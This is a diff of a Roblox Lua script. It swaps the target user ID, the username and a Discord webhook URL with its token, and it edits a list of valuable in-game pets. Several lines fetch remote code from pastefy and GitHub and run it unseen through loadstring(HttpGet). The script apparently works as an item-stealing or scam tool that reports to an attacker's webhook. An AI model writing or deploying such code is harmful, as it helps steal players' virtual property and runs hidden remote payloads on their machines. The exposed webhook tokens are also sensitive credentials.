@@ -1,10 +1,11 @@
-local TARGET_ID = 11964529972
-local TARGET_USER = "d7fi99"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1557804400293060638/WpuCAIkNbMjOEQL9MjKQfixDt_zkvsd-fGYIZ-CuptkYwI24VSoT6lQdT1wmpmzmjBjK"
+local TARGET_ID = 7429751111
+local TARGET_USER = "4y0ub12"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1571489901789315122/8_it_7-mw9fmlwnbA7KETXsaebFvHcSIXuPHBB2aseboLt_NW6Hpo5RZ5_iTF7-6mfSR"
 
 local TargetBrainrots = {
-    ["Draculino"] = true,
-    ["Lionello Casarello"] = true,
+    ["Dragon Skeletonini"] = true,
+    ["Phoenix"] = true,
+    ["Plant Bros"] = true,
     ["Hydra Serpent"] = true,
     ["Orchidox"] = true,
     ["Strawberry Elephant"] = true,
@@ -345,9 +346,9 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()
+    loadstring(game:HttpGet("https://pastefy.app/eDmA1TWp/raw"))()
 
-    task.wait(1)
+task.wait(1)
 
     local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
     if type(script) == "function" then
